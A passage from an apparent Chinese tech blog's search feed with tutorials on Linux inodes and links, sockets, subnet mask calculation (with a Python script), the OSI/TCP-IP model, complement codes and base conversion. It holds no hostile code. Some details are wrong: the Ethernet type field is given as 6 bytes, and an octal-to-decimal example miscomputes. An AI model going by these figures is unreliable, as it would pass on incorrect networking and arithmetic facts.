打开一个文件以后，系统就以inode号码来识别这个文件，不再考虑文件名。因此，通常来说，系统无法从inode号码得知文件名。<br>      第3点使得软件更新变得简单，可以在不关闭软件的情况下进行更新，不需要重启。因为系统通过inode号码，识别运行中的文件，不通过文件名。更新的时候，新版文件以同样的文件名，生成一个新的inode，不会影响到运行中的文件。等到下一次运行这个软件的时候，文件名就自动指向新版文件，旧版文件的inode则被回收。</p><p>九 实际问题</p><p>在一台配置较低的Linux服务器（内存、硬盘比较小）的/data分区内创建文件时，系统提示磁盘空间不足，用df -h命令查看了一下磁盘使用情况，发现/data分区只使用了66%，还有12G的剩余空间，按理说不会出现这种问题。 后来用df -i查看了一下/data分区的索引节点(inode)，发现已经用满(IUsed=100%)，导致系统无法创建新目录和文件。 </p><p>查找原因：</p><p>　　/data/cache目录中存在数量非常多的小字节缓存文件，占用的Block不多，但是占用了大量的inode。 </p><p>解决方案：<br>　　1、删除/data/cache目录中的部分文件，释放出/data分区的一部分inode。<br>　　2、用软连接将空闲分区/opt中的newcache目录连接到/data/cache，使用/opt分区的inode来缓解/data分区inode不足的问题：<br>　　ln -s /opt/newcache /data/cache </p><h3 id="软连接硬链接"><a href="#软连接硬链接" class="headerlink" title="软连接硬链接"></a>软连接硬链接</h3><p>软连接：可以跨分区<br>特点：</p><ul><li>快捷方式</li><li>删除链接文件，源文件无影响</li><li>删除源文件，链接文件失效</li><li>修改原文件、链接文件，内容都变</li><li>软连接是指向（定向）文件名，inode 号不一样</li></ul><p>ln -s 原路径 目标路径</p><p>硬链接：不可以跨分区<br>特点：</p><ul><li>删除链接文件，源文件无影响</li><li>删除源文件，链接文件无影响</li><li>修改原文件、链接文件，内容都变</li><li>硬链接是执行inode号，inode 号一样</li></ul><p>ln 原路径 目标路径<br>ln /root/a.txt /root/b.txt</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>什么是socket</title>
      <link href="/article/network-what-socket.html"/>
      <url>/article/network-what-socket.html</url>
      
        <content type="html"><![CDATA[<h3 id="osi七层"><a href="#osi七层" class="headerlink" title="osi七层"></a>osi七层</h3><p><img src="../do/images/basis/osi.jpg" alt></p><h3 id="socket层"><a href="#socket层" class="headerlink" title="socket层"></a>socket层</h3><p><img src="../do/images/basis/socket.jpg" alt></p><h3 id="socket是什么"><a href="#socket是什么" class="headerlink" title="socket是什么"></a>socket是什么</h3><p>Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。在设计模式中，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。</p><p>所以，我们无需深入理解tcp/udp协议，socket已经为我们封装好了，我们只需要遵循socket的规定去编程，写出的程序自然就是遵循tcp/udp标准的。</p><p>也有人将socket说成ip+port，ip是用来标识互联网中的一台主机的位置，而port是用来标识这台机器上的一个应用程序，ip地址是配置到网卡上的，而port是应用程序开启的，ip与port的绑定就标识了互联网中独一无二的一个应用程序</p><p>而程序的pid是同一台机器上不同进程或者线程的标识</p><h3 id="套接字工作流程"><a href="#套接字工作流程" class="headerlink" title="套接字工作流程"></a>套接字工作流程</h3><p>一个生活中的场景。你要打电话给一个朋友，先拨号，朋友听到电话铃声后提起电话，这时你和你的朋友就建立起了连接，就可以讲话了。等交流结束，挂断电话结束此次交谈。 生活中的场景就解释了这工作原理。<br><img src="../do/images/basis/socket3.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>子网掩码的计算</title>
      <link href="/article/network-mask-calculation.html"/>
      <url>/article/network-mask-calculation.html</url>
      
        <content type="html"><![CDATA[<h3 id="什么是网络号？"><a href="#什么是网络号？" class="headerlink" title="什么是网络号？"></a>什么是网络号？</h3><ul><li>网络号是每一段IP地址的第一组，通常用于表示某一段IP地址池。</li><li>如：192.168.1.0/24 其表示:</li></ul><table><thead><tr><th align="center">IP地址</th><th align="center">子网掩码</th></tr></thead><tbody><tr><td align="center">192.168.1.0~192.168.1.255</td><td align="center">255.255.255.0</td></tr></tbody></table><h3 id="什么是广播号？"><a href="#什么是广播号？" class="headerlink" title="什么是广播号？"></a>什么是广播号？</h3><ul><li>广播号是每一段IP地址的最后一组，通常用于网络中的广播，顾名思义。</li><li>如：192.168.1.0/24 其中最后一组 192.168.1.255 就是该段IP的广播号。</li></ul><h3 id="什么是子网掩码？"><a href="#什么是子网掩码？" class="headerlink" title="什么是子网掩码？"></a>什么是子网掩码？</h3><ul><li>子网掩码通常是用于划分网络使用，尤其公网IP地址比较常见。</li><li>如：61.166.150.2/30和61.166.150.3/30在不同网段。</li></ul><h3 id="二进制如何换算？"><a href="#二进制如何换算？" class="headerlink" title="二进制如何换算？"></a>二进制如何换算？</h3><ul><li>计算子网掩码或IP地址等必用知识。</li></ul><p>| 二进制换算对照表 |<br>|:—–:|:—–:|:—–:|:—–:|:—–:|:—–:|:—–:|:—–:|<br>| 128 | 64 | 32 | 16 | 8 | 4 | 2 | 1 |<br>| 1 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |<br>| 将二进制中1对应的数字相加即可 |</p><h3 id="可划分子网数计算公式"><a href="#可划分子网数计算公式" class="headerlink" title="可划分子网数计算公式"></a>可划分子网数计算公式</h3><p>可划分子网数 = 2 ^ （借位组中”1”个数）<br>如：255.255.255.128 → 11111111.11111111.11111111. 1 000000<br>结果：2 ^ 1 = 2<br>255.255.255.128 可将网络划分为2个网段</p><h3 id="可容纳主机数计算公式"><a href="#可容纳主机数计算公式" class="headerlink" title="可容纳主机数计算公式"></a>可容纳主机数计算公式</h3><p>可容纳主机数 = 2 ^ （借位组中“0”个数）<br>如：255.255.255.128 → 11111111.11111111.11111111. 1 000000<br>结果：2 ^ 7 = 128<br>255.255.255.128 每个网段最多可容纳128台主机。</p><p>可容纳主机数和可用IP地址是两回事。<br>可容纳主机数是计算出每个网段能容纳的数量，其中已经包含网络号和广播号！<br>可用IP地址却不包含网络号和广播号！所以还要减去。<br>可用IP地址 = 可容纳主机数 – 2  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">Networksegment = sys.argv[1]</span><br><span class="line">print(&apos;网段：&apos;,Networksegment)</span><br><span class="line">Network,NetworkMask = Networksegment.split(&apos;/&apos;)</span><br><span class="line"></span><br><span class="line">NetworkMaskBin = &apos;&#123;mask:0&lt;32&#125;&apos;.format(mask=&apos;&#123;str:1&lt;&#123;NetworkMask&#125;&#125;&apos;.format(str=1,NetworkMask=NetworkMask))</span><br><span class="line">NetMask = &apos;&#123;&#125;.&#123;&#125;.&#123;&#125;.&#123;&#125;&apos;.format(int(NetworkMaskBin[0:8],2),int(NetworkMaskBin[8:16],2),int(NetworkMaskBin[16:24],2),int(NetworkMaskBin[24:32],2))</span><br><span class="line">print(&apos;子网掩码:&apos;,NetMask)</span><br><span class="line"></span><br><span class="line">NetMaskBin = &apos;&#123;&#125;.&#123;&#125;.&#123;&#125;.&#123;&#125;&apos;.format(NetworkMaskBin[0:8],NetworkMaskBin[8:16],NetworkMaskBin[16:24],NetworkMaskBin[24:32])</span><br><span class="line">print(&apos;子网掩码二进制:&apos;,NetMaskBin)</span><br><span class="line"></span><br><span class="line">IP1,IP2,IP3,IP4 = Network.split(&apos;.&apos;)</span><br><span class="line">NetIPBin = &apos;&#123;:08b&#125;.&#123;:08b&#125;.&#123;:08b&#125;.&#123;:08b&#125;&apos;.format(int(IP1),int(IP2),int(IP3),int(IP4))</span><br><span class="line">print(&apos;IP地址二进制：&apos;,NetIPBin)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NetMaskBinS = &apos;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&apos;.format(NetworkMaskBin[0:8],NetworkMaskBin[8:16],NetworkMaskBin[16:24],NetworkMaskBin[24:32])</span><br><span class="line">NetIPNetIPBinS = &apos;&#123;:08b&#125;&#123;:08b&#125;&#123;:08b&#125;&#123;:08b&#125;&apos;.format(int(IP1),int(IP2),int(IP3),int(IP4))</span><br><span class="line"></span><br><span class="line">StartIP = []</span><br><span class="line">i = 0</span><br><span class="line">for string in NetMaskBinS:</span><br><span class="line">    StartIP.append(&apos;&#123;&#125;&apos;.format(int(string) * int(NetIPNetIPBinS[i])))</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">starting = &apos;&apos;.join(StartIP)</span><br><span class="line">print(&apos;IP地址和子网掩码进行二进制AND运算：&#123;&#125;.&#123;&#125;.&#123;&#125;.&#123;&#125;&apos;.format(starting[0:8],starting[8:16],starting[16:24],starting[24:32]))</span><br><span class="line">StartIP = &apos;&#123;&#125;.&#123;&#125;.&#123;&#125;.&#123;&#125;&apos;.format(int(starting[0:8],2),int(starting[8:16],2),int(starting[16:24],2),int(starting[24:32],2))</span><br><span class="line">print(&apos;第一个IP：&apos;,StartIP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EndIPBin = 32 - int(NetworkMask)</span><br><span class="line">EndIPBin = &apos;&#123;mask:0&gt;32&#125;&apos;.format(mask=&apos;&#123;str:1&lt;&#123;EndIPBin&#125;&#125;&apos;.format(str=1,EndIPBin=EndIPBin))</span><br><span class="line"></span><br><span class="line">if int(EndIPBin[0:8],2) == 0:</span><br><span class="line">    EndIP1 = IP1</span><br><span class="line">else:</span><br><span class="line">    EndIP1 = int(EndIPBin[0:8],2) + int(starting[0:8],2)</span><br><span class="line">if int(EndIPBin[8:16],2) == 0:</span><br><span class="line">    EndIP2 = IP2</span><br><span class="line">else:</span><br><span class="line">    EndIP2 = int(EndIPBin[8:16],2) + int(starting[8:16],2)</span><br><span class="line">if int(EndIPBin[16:24],2) == 0:</span><br><span class="line">    EndIP3 = IP3</span><br><span class="line">else:</span><br><span class="line">    EndIP3 = int(EndIPBin[16:24],2) + int(starting[16:24],2)</span><br><span class="line">if int(EndIPBin[24:32],2) == 0:</span><br><span class="line">    EndIP4 = IP4</span><br><span class="line">else:</span><br><span class="line">    EndIP4 = int(EndIPBin[24:32],2) + int(starting[24:32],2)</span><br><span class="line"></span><br><span class="line">print(&apos;最后一个IP：&#123;&#125;.&#123;&#125;.&#123;&#125;.&#123;&#125;&apos;.format(EndIP1,EndIP2,EndIP3,EndIP4))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSI七层模型详解</title>
      <link href="/article/network-osi-model.html"/>
      <url>/article/network-osi-model.html</url>
      
        <content type="html"><![CDATA[<h1 id="一-操作系统基础"><a href="#一-操作系统基础" class="headerlink" title="一.操作系统基础"></a>一.操作系统基础</h1><p>操作系统:(Operating System，简称OS)是管理和控制计算机硬件与软件资源的计算机程序，是直接运行在“裸机”上的最基本的系统软件，任何其他软件都必须在操作系统的支持下才能运行。</p><p>注：计算机(硬件)－&gt;os－&gt;应用软件</p><h1 id="二-网络通信原理"><a href="#二-网络通信原理" class="headerlink" title="二.网络通信原理"></a>二.网络通信原理</h1><h1 id="互联网的本质就是一系列的网络协议"><a href="#互联网的本质就是一系列的网络协议" class="headerlink" title="互联网的本质就是一系列的网络协议"></a>互联网的本质就是一系列的网络协议</h1><p>一台硬设有了操作系统，然后装上软件你就可以正常使用了，然而你也只能自己使用，每个人都拥有一台自己的机器，然而彼此孤立<br>英语成为世界上所有人通信的统一标准，如果把计算机看成分布于世界各地的人，那么连接两台计算机之间的internet实际上就是一系列统一的标准，这些标准称之为互联网协议，互联网的本质就是一系列的协议，总称为‘互联网协议’（Internet Protocol Suite).<br>互联网协议的功能：定义计算机如何接入internet，以及接入internet的计算机通信的标准。</p><h1 id="OSI七层协议"><a href="#OSI七层协议" class="headerlink" title="OSI七层协议"></a>OSI七层协议</h1><p>互联网协议按照功能不同分为<strong>TCP/IP四层</strong>或<strong>TCP/IP五层</strong>或<strong>OSI七层</strong>：<br><img src="../do/images/basis/OSI.png" alt><br>每层运行常见物理设备:<br><img src="../do/images/basis/osi-tol.png" alt></p><h1 id="TCP-IP五层模型讲解"><a href="#TCP-IP五层模型讲解" class="headerlink" title="TCP/IP五层模型讲解"></a>TCP/IP五层模型讲解</h1><p>我们将应用层，表示层，会话层并作应用层，从TCP/IP五层协议的角度来阐述每层的由来与功能，搞清楚了每层的主要协议,就理解了整个互联网通信的原理。<br>首先，用户感知到的只是最上面一层应用层，自上而下每层都依赖于下一层，所以我们从最下一层开始切入，比较好理解每层都运行特定的协议，越往上越靠近用户，越往下越靠近硬件.</p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>物理层由来：上面提到，孤立的计算机之间要想一起玩，就必须接入internet，言外之意就是计算机之间必须完成组网.<br><img src="../do/images/basis/wuliceng.png" alt><br>物理层功能：主要是基于电器特性发送高低电压(电信号)，高电压对应数字1，低电压对应数字0</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>数据链路层由来：单纯的电信号0和1没有任何意义，必须规定电信号多少位一组，每组什么意思.<br>数据链路层的功能：定义了电信号的分组方式</p><h3 id="以太网协议"><a href="#以太网协议" class="headerlink" title="以太网协议"></a>以太网协议</h3><p>早期的时候各个公司都有自己的分组方式，后来形成了统一的标准，即以太网协议ethernet。<br>ethernet规定</p><ul><li>一组电信号构成一个数据包，叫做‘帧’</li><li>每一数据帧分成：报头head和数据data两部分</li></ul><table><thead><tr><th align="center">head</th><th align="center">data</th></tr></thead><tbody><tr><td align="center">以太网头：原MAC地址+目标MAC地址</td><td align="center">数据</td></tr></tbody></table><p>head包含：(固定18个字节)</p><ul><li>发送者／源地址，6个字节</li><li>接收者／目标地址，6个字节</li><li>数据类型，6个字节</li></ul><p>data包含：(最短46字节，最长1500字节)</p><ul><li>数据包的具体内容<br>head长度＋data长度＝最短64字节，最长1518字节，超过最大限制就分片发送</li></ul><h3 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h3><p>head中包含的源和目标地址由来：ethernet规定接入internet的设备都必须具备网卡，发送端和接收端的地址便是指网卡的地址，即MAC地址。<br>MAC地址：每块网卡出厂时都被烧制上一个世界唯一的MAC地址，长度为48位2进制，通常由12位16进制数表示（前六位是厂商编号，后六位是流水线号）。</p><h3 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h3><p>有了MAC地址，同一网络内的两台主机就可以通信了（一台主机通过ARP协议获取另外一台主机的MAC地址）。<br>ethernet采用最原始的方式，广播的方式进行通信，即计算机通信基本靠吼。<br><img src="../do/images/basis/guangbo.png" alt></p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>网络层由来：有了ethernet、MAC地址、广播的发送方式，世界上的计算机就可以彼此通信了，问题是世界范围的互联网是由一个个彼此隔离的小的局域网组成的，那么如果所有的通信都采用以太网的广播方式，那么一台机器发送的包全世界都会收到.<br>这就不仅仅是效率低的问题了，这会是一种灾难，广播风暴。<br><img src="../do/images/basis/internet-layer.jpg" alt></p><p>上图结论：必须找出一种方法来区分哪些计算机属于同一广播域，哪些不是，如果是就采用广播的方式发送，如果不是，就采用路由的方式（向不同广播域／子网分发数据包），MAC地址是无法区分的，它只跟厂商有关。<br>网络层功能：引入一套新的地址用来区分不同的广播域／子网，这套地址即网络地址。</p><h3 id="IP数据包"><a href="#IP数据包" class="headerlink" title="IP数据包"></a>IP数据包</h3><p>IP数据包也分为head和data部分，无须为IP包定义单独的栏位，直接放入以太网包的data部分</p><p>head：长度为20到60字节</p><p>data：最长为65,515字节。</p><p>而以太网数据包的”数据”部分，最长只有1500字节。因此，如果IP数据包超过了1500字节，它就需要分割成几个以太网数据包，分开发送了。</p><p>以太网：</p><table><thead><tr><th align="center">head</th><th align="center">data</th></tr></thead><tbody><tr><td align="center">以太网头：原MAC地址+目标MAC地址</td><td align="center">数据</td></tr></tbody></table><p>IP数据包：</p><table><thead><tr><th align="center">head</th><th align="center">IP头</th><th align="center">IP数据</th></tr></thead><tbody><tr><td align="center">以太网头</td><td align="center">IP头部：原IP+目标IP</td><td align="center">IP数据</td></tr></tbody></table><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>ARP协议由来：计算机通信基本靠吼，即广播的方式，所有上层的包到最后都要封装上以太网头，然后通过以太网协议发送，在谈及以太网协议时候，我门了解到通信是基于MAC的广播方式实现，计算机在发包时，获取自身的MAC是容易的，如何获取目标主机的MAC，就需要通过ARP协议。<br>ARP协议功能：广播的方式发送数据包，获取目标主机的MAC地址。</p><p>协议工作方式：每台主机IP都是已知的</p><h3 id="同一子网"><a href="#同一子网" class="headerlink" title="同一子网"></a>同一子网</h3><p>例如：主机172.16.10.10/24访问172.16.10.11/24<br>一：首先通过IP地址和子网掩码计算并区分出自己所处的子网，不同的子网，发送的数据包不同</p><table><thead><tr><th align="center">场景</th><th align="center">数据包地址</th></tr></thead><tbody><tr><td align="center">同一子网</td><td align="center">目标主机MAC，目标主机IP</td></tr></tbody></table><p>二：分析172.16.10.10/24与172.16.10.11/24处于同一网络</p><table><thead><tr><th align="center">请求</th><th align="center">源MAC</th><th align="center">目标MAC</th><th align="center">源IP</th><th align="center">目标IP</th><th align="center">数据部分</th></tr></thead><tbody><tr><td align="center">发送端主机</td><td align="center">发送端MAC</td><td align="center">FF:FF:FF:FF:FF:FF</td><td align="center">172.16.10.10/24</td><td align="center">172.16.10.11/24</td><td align="center">数据</td></tr><tr><td align="center">发送端主机</td><td align="center">发送端MAC</td><td align="center">不知道目标MAC地址，想获取目标IP的MAC地址，用F表示</td><td align="center">数据包中的原IP</td><td align="center">数据包中的目标IP</td><td align="center">数据</td></tr></tbody></table><p>三：这个包会以广播的方式在发送端所处的自网内传输，所有主机接收后拆开包，发现目标IP为自己的，就响应，返回自己的MAC。</p><table><thead><tr><th align="center">返回</th><th align="center">源MAC</th><th align="center">目标MAC</th><th align="center">源IP</th><th align="center">目标IP</th><th align="center">数据部分</th></tr></thead><tbody><tr><td align="center">目标主机</td><td align="center">目标MAC</td><td align="center">发送端MAC</td><td align="center">172.16.10.11/24</td><td align="center">172.16.10.10/24</td><td align="center">数据</td></tr><tr><td align="center">目标主机</td><td align="center">目标MAC</td><td align="center">发送端MAC</td><td align="center">目标IP</td><td align="center">原IP</td><td align="center">数据中包含目标IP的MAC地址</td></tr></tbody></table><p>获取返回的MAC地址之后，再次封包并发送。</p><table><thead><tr><th align="center">请求</th><th align="center">源MAC</th><th align="center">目标MAC</th><th align="center">源IP</th><th align="center">目标IP</th><th align="center">数据部分</th></tr></thead><tbody><tr><td align="center">发送端主机</td><td align="center">发送端MAC</td><td align="center">目标MAC</td><td align="center">172.16.10.10/24</td><td align="center">172.16.10.11/24</td><td align="center">数据</td></tr></tbody></table><h3 id="不同子网"><a href="#不同子网" class="headerlink" title="不同子网"></a>不同子网</h3><p>例如：主机172.16.10.10/24访问182.16.10.11/24<br>一：首先通过IP地址和子网掩码计算并区分出自己所处的子网，不同的子网，发送的数据包不同</p><table><thead><tr><th align="center">场景</th><th align="center">数据包地址</th></tr></thead><tbody><tr><td align="center">不同子网</td><td align="center">网关MAC，目标主机IP</td></tr></tbody></table><p>二：分析172.16.10.10/24与182.16.10.11/24处于不同网络(如果不是同一网络，那么下表中目标IP为172.16.10.1,会先通过ARP获取网关的MAC)</p><table><thead><tr><th align="center">请求</th><th align="center">源MAC</th><th align="center">目标MAC</th><th align="center">源IP</th><th align="center">目标IP</th><th align="center">数据部分</th></tr></thead><tbody><tr><td align="center">发送端主机</td><td align="center">发送端MAC</td><td align="center">FF:FF:FF:FF:FF:FF</td><td align="center">172.16.10.10/24</td><td align="center">172.16.10.1</td><td align="center">数据</td></tr><tr><td align="center">发送端主机</td><td align="center">发送端MAC</td><td align="center">不知道网关MAC地址，想获取网关的MAC地址，用F表示</td><td align="center">数据包中的原IP</td><td align="center">数据包中的网关IP</td><td align="center">数据</td></tr></tbody></table><p>三：这个包会以广播的方式在发送端所处的自网内传输，所有主机接收后拆开包，发现目标IP为自己的，就响应，返回自己的MAC。</p><table><thead><tr><th align="center">返回</th><th align="center">源MAC</th><th align="center">目标MAC</th><th align="center">源IP</th><th align="center">目标IP</th><th align="center">数据部分</th></tr></thead><tbody><tr><td align="center">网关</td><td align="center">网关MAC</td><td align="center">发送端MAC</td><td align="center">172.16.10.1</td><td align="center">172.16.10.10/24</td><td align="center">数据</td></tr><tr><td align="center">网关</td><td align="center">网关MAC</td><td align="center">发送端MAC</td><td align="center">网关IP</td><td align="center">发送端IP</td><td align="center">数据中包含网关的MAC地址</td></tr></tbody></table><p>获取返回的MAC地址之后，再次封包并发送。</p><table><thead><tr><th align="center">请求</th><th align="center">源MAC</th><th align="center">目标MAC</th><th align="center">源IP</th><th align="center">目标IP</th><th align="center">数据部分</th></tr></thead><tbody><tr><td align="center">发送端主机</td><td align="center">发送端MAC</td><td align="center">网关MAC</td><td align="center">172.16.10.10/24</td><td align="center">182.16.10.11/24</td><td align="center">数据</td></tr><tr><td align="center">发送端主机</td><td align="center">发送端MAC</td><td align="center">网关MAC</td><td align="center">发送端IP</td><td align="center">目标地址IP</td><td align="center">数据</td></tr></tbody></table><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>传输层的由来：网络层的ip帮我们区分子网，以太网层的mac帮我们找到主机，然后大家使用的都是应用程序，你的电脑上可能同时开启qq，暴风影音，等多个应用程序，</p><p>那么我们通过ip和mac找到了一台特定的主机，如何标识这台主机上的应用程序，答案就是端口，端口即应用程序与网卡关联的编号。</p><p>传输层功能：建立端口到端口的通信</p><p>补充：端口范围0-65535，0-1023为系统占用端口</p><p>tcp协议：</p><p>可靠传输，TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。</p><p>以太网头 ip 头               tcp头               数据<br>udp协议：</p><p>不可靠传输，”报头”部分一共只有8个字节，总长度不超过65,535字节，正好放进一个IP数据包。</p><p>以太网头 ip头                udp头               数据                                            </p>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原码补码反码</title>
      <link href="/article/network-the-code.html"/>
      <url>/article/network-the-code.html</url>
      
        <content type="html"><![CDATA[<h3 id="机器数"><a href="#机器数" class="headerlink" title="机器数"></a>机器数</h3><p>一个数在计算机中的二进制表示形式，叫做这个数的机器数。机器数是带符号的，在计算机用一个数的最高位存放符号，正数为0，负数为1.<br>例如：十进制中的 +3，计算机字长为8位，转换成二进制就是0 0000011.如果是-3，就是1 0000011.前面开头一位表示符号。<br>那么这里的00000011和10000011就是机器数。</p><h3 id="真值"><a href="#真值" class="headerlink" title="真值"></a>真值</h3><p>由于第一位是符号，所以机器数的形式就不等于真正的数值。<br>例如上边的符号数 10000011，最高位1代表负数，其真正数值是 -3 而不是形式值131。（10000011转换成十进制等于131）。所以，为区别起见，带符号的机器数对应的真正数值称为机器数的真值。</p><h3 id="原码、反码、补码"><a href="#原码、反码、补码" class="headerlink" title="原码、反码、补码"></a>原码、反码、补码</h3><p>原码、反码、补码都是有符号的用二进制表示数的方法，均由<strong>符号位</strong>和<strong>数值位</strong>构成。</p><h3 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h3><p>原码是符号加上真值的绝对值，即用第一位表示符号，其余位表示值。<br>如8位的二进制：<br>+1 = 0000 0001<br>-1 = 1000 0001<br>第一位是符号位，余下7位是数值位。因为第一位是符号位，所以8位二进制数的取值范围是：<br>[1111 1111 , 0111 1111] 即 [-127 , 127]</p><h3 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h3><p>正数的反码是其本身。<br>负数的反码是在其原码的基础上，符号位不变，其余各个取反。<br>[+1] = [00000001]原 = [00000001]反<br>[-1] = [10000001]原 = [11111110]反</p><h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p>正数的补码是其本身。<br>负数的补码实在原码的基础上，符号位不变。其余各位取反，最后+1，即反码的基础上+1.<br>[+1] = [00000001]原 = [00000001]补<br>[-1] = [10000001]原 = [11111111]补</p><p><strong>在计算机系统中。数值一律使用补码来（存储）.</strong><br>主要原因：<br>使用补码，可以将符号和其他位统一处理，同时，减法也可以按加法来处理。<br>另外，两个用补码表示的数相加时，如果最高位（符号位）有位进，则进位被舍弃。</p>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进制之间的转换</title>
      <link href="/article/network-hex-convert.html"/>
      <url>/article/network-hex-convert.html</url>
      
        <content type="html"><![CDATA[<h3 id="二进制转八进制"><a href="#二进制转八进制" class="headerlink" title="二进制转八进制"></a>二进制转八进制</h3><p>三位合一位(8=2的3次方)，右往左每三位一组，依次写出每组二进制所对应的十进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0101011</span><br><span class="line">0 101 011</span><br><span class="line">0*2(1-1)次方  --- 0</span><br><span class="line">1*2(3-1)次方+0*2(2-1)次方+1*2(1-1)次方  --- 5</span><br><span class="line">0*2(3-1)次方+1*2(2-1)次方+1*2(1-1)次方  --- 3</span><br><span class="line">053</span><br><span class="line"></span><br><span class="line">11101010010110100</span><br><span class="line">11 101 010 010 110 100 =3 5 2 2 6 4 = 352264</span><br></pre></td></tr></table></figure><h3 id="二进制转十进制"><a href="#二进制转十进制" class="headerlink" title="二进制转十进制"></a>二进制转十进制</h3><p>逢二进一</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10 = 1*2(2-1)次方+0*2(1-1)次方</span><br><span class="line">(10101)2 = 1*2(5-1)次方+0*2(4-1)次方+1*2(3-1)次方+0*2(2-1)次方+1*2(1-1)次方</span><br></pre></td></tr></table></figure><h3 id="二进制转十六进制"><a href="#二进制转十六进制" class="headerlink" title="二进制转十六进制"></a>二进制转十六进制</h3><p>四位合一位(16=2的4次方)，分别向左右每四位一组，依次写出每组4位二进制所对应的十进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">000111010110</span><br><span class="line">0001 1101 0110</span><br><span class="line">1*2(1-1)次方 --- 1</span><br><span class="line">1*2(4-1)次方+1*2(3-1)次方+0*2(2-1)次方+1*2(1-1)次方 --- 13</span><br><span class="line">0*2(4-1)次方+1*2(3-1)次方+1*2(2-1)次方+0*2(1-1)次方 --- 6</span><br><span class="line">1D6</span><br></pre></td></tr></table></figure><h3 id="八进制转十进制"><a href="#八进制转十进制" class="headerlink" title="八进制转十进制"></a>八进制转十进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 = 1*8(2-1)次方+1*8(1-1)次方</span><br></pre></td></tr></table></figure><h3 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2 13 ----余1</span><br><span class="line"> 2 6 ----余0</span><br><span class="line"> 2 3 ----余1</span><br><span class="line"> 2 1 ----余1</span><br><span class="line">   0 ----余0</span><br><span class="line">   (01101)2 ---&gt; 1*2(4-1)次方+1*2(3-1)次方+1*2(1-1)次方</span><br></pre></td></tr></table></figure><h3 id="十六进制转二进制"><a href="#十六进制转二进制" class="headerlink" title="十六进制转二进制"></a>十六进制转二进制</h3><p>一位一组，分别转换成二进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4AF8B</span><br><span class="line">4 A F 8 B</span><br></pre></td></tr></table></figure><h3 id="十六进制转十进制"><a href="#十六进制转十进制" class="headerlink" 